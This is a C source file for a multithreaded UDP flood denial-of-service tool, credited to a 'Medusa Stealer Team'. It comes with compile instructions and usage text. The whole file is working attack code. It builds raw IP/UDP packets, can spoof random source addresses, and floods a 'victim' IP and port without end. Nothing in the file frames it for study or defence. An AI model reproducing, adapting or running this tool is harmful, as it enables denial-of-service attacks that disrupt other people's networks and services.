/*
=============================================================================
// compilation : gcc udp-flood.c -o udp-flood
// rm -rf ./udp-flood; gcc udp-flood.c -o udp-flood; chmod 777 *;
// DEVELOPPER BY MEDUSA STEALER TEAM
=============================================================================
*/

#include <time.h>
#include <pthread.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <arpa/inet.h>

#define MAX_PACKET_SIZE 4096
#define PHI 0x9e3779b9

static uint32_t Q[4096], c = 362436;

void init_rand(uint32_t x)
{
    int i;
    Q[0] = x;
    Q[1] = x + PHI;
    Q[2] = x + PHI + PHI;
    for (i = 3; i < 4096; i++)
    {
        Q[i] = Q[i - 3] ^ Q[i - 2] ^ PHI ^ i;
    }
}

uint32_t rand_cmwc(void)
{
    uint64_t t, a = 18782LL;
    static uint32_t i = 4095;
    uint32_t x, r = 0xfffffffe;
    i = (i + 1) & 4095;
    t = a * Q[i] + c;
    c = (t >> 32);
    x = t + c;
    if (x < c)
    {
        x++;
        c++;
    }
    return (Q[i] = r - x);
}

unsigned short csum (unsigned short *buf, int count)
{
    register uint64_t sum = 0;
    while( count > 1 ) { sum += *buf++; count -= 2; }
    if(count > 0) { sum += *(unsigned char *)buf; }
    while (sum>>16) { sum = (sum & 0xffff) + (sum >> 16); }
    return (uint16_t)(~sum);
}

struct thread_data
{
    int thread_id;
    int num_threads;
    char *victim;
    int port;
    int time;
    int spoofed;
    int packetsize;
    int pollinterval;
};

struct thread_data td;

void setup_ip_header(struct iphdr *iph)
{
    iph->ihl = 5;
    iph->version = 4;
    iph->tos = 0;
    iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + td.packetsize;
    iph->id = htonl(54321);
    iph->frag_off = 0;
    iph->ttl = MAXTTL;
    iph->protocol = IPPROTO_UDP;
    iph->check = 0;
}

void setup_udp_header(struct udphdr *udph)
{
    udph->source = htons(5678);
    udph->dest = htons(td.port);
    udph->check = 0;
    memset((void *)udph + sizeof(struct udphdr), 0x00, td.packetsize);
    udph->len=htons(sizeof(struct udphdr) + td.packetsize);
}

void *flood(void *par1)
{
    struct thread_data *td = (struct thread_data *)par1;
    fprintf(stdout, "Attacking %s:%d with %d threads.\n", td->victim, td->port, td->num_threads);
    char datagram[MAX_PACKET_SIZE];
    struct iphdr *iph = (struct iphdr *)datagram;
    struct udphdr *udph = (/*u_int8_t*/void *)iph + sizeof(struct iphdr);
    struct sockaddr_in sin;
    sin.sin_family = AF_INET;
    sin.sin_port = htons(td->port);
    sin.sin_addr.s_addr = inet_addr(td->victim);
    int s = socket(PF_INET, SOCK_RAW, IPPROTO_UDP);
    if(s < 0){
        fprintf(stderr, "Could not open raw socket.\n");
        exit(-1);
    }
    memset(datagram, 0, MAX_PACKET_SIZE);
    setup_ip_header(iph);
    setup_udp_header(udph);
    udph->source = htons(rand() % 65535);
    iph->daddr = sin.sin_addr.s_addr;
    iph->check = csum ((unsigned short *) datagram, iph->tot_len >> 1);
    int tmp = 1;
    const int *val = &tmp;
    if(setsockopt(s, IPPROTO_IP, IP_HDRINCL, val, sizeof (tmp)) < 0){
        fprintf(stderr, "Error: setsockopt() - Cannot set HDRINCL!\n");
        exit(-1);
    }
    init_rand(time(NULL));
    register unsigned int i;
    i = 0;

    while(1){
        sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *) &sin, sizeof(sin));
        udph->source = htons(rand() % 65535);
        iph->check = csum ((unsigned short *) datagram, iph->tot_len >> 1);
        if(i == td->pollinterval)
        {
            if(td->spoofed == 0) setup_ip_header(iph);
            // sinon on gethostbyname pour avoir l'ip de l'host
            else { iph->saddr = (rand_cmwc() >> 24 & 0xFF) << 24 | (rand_cmwc() >> 16 & 0xFF) << 16 | (rand_cmwc() >> 8 & 0xFF) << 8 | (rand_cmwc() & 0xFF); }
            i = 0;
            continue;
        }
        i++;
    }
}

int main(int argc, char *argv[ ])
{
    if(argc < 5){
        fprintf(stderr, "Invalid parameters!\n");
        fprintf(stdout, "Usage: %s <target IP> <port> <threads> <time> <spoofed> <packetsize> <pollinterval>.\n", argv[0]);
        exit(-1);
    }
    int num_threads = atoi(argv[3]);
    td.thread_id = 0;
    td.num_threads = num_threads;
    td.victim = argv[1];
    td.port = atoi(argv[2]);
    td.time = atoi(argv[4]);
    td.spoofed = atoi(argv[5]);
    td.packetsize = atoi(argv[6]);
    td.pollinterval = atoi(argv[7]);
    pthread_t thread[num_threads];
    int i;
    for(i = 0;i<num_threads;i++){
        pthread_create( &thread[i], NULL, &flood, (void *) &td);
    }
    fprintf(stdout, "Starting Flood...\n");
    fprintf(stdout, "Developed by: https://medusa-stealer.cc/\n");
    for(i = 0;i<(td.time);i++)
    {
        sleep(1);
        if((i % 10) == 0)
        {
            fprintf(stdout, ".");
            fflush(stdout);
        }
    }
    return 0;
}
